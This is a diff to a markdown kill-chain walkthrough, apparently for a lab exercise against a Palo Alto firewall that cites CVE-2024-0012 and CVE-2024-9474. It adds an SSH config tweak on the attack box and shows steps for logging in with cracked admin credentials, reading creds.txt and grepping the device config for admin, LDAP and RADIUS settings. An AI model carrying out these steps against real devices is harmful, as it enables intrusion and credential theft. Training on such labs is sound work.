@@ -30,6 +30,22 @@ CVE: `CVE-2024-0012` and `CVE-2024-9474`
 
 ## Phase 0: Initial Setup for Kill Chain
 
+### SSH Config File Update
+
+On your attack box, type in the following command:
+```
+sudo nano /etc/ssh/ssh_config
+```
+Then scroll to the very bottom and add the following block:
+```
+Host *
+    HostkeyAlgorithms +ssh-rsa
+    PubkeyAcceptedAlgorithms +ssh-rsa
+```
+Then press `ctrl + O` and `ctrl + x`
+This saves your config so that later on when you ssh onto your boxes, you dont have to include extra options with your ssh command.
+
+
 ### SSH Proxy Chain
 
 #### Terran (104.55.222.X) `On your Attack Box`
@@ -453,7 +469,7 @@ cat creds.txt
 6. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:
 
 ```bash
-ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@<palo alto IP>
+ssh admin@<palo alto IP>
 ```
 
 - When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.
@@ -484,13 +500,12 @@ show routing route
 show arp all
 ```
 
-#### Look for management configs or logs
+#### Look for management configs or logs 
 
 ```bash
 cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 ```
-
-Copy the output and paste into a text editor on your kali and save the file.
+Copy the output into a text file
 
 #### Attempt to pivot through firewall if routing/NAT is enabled
 
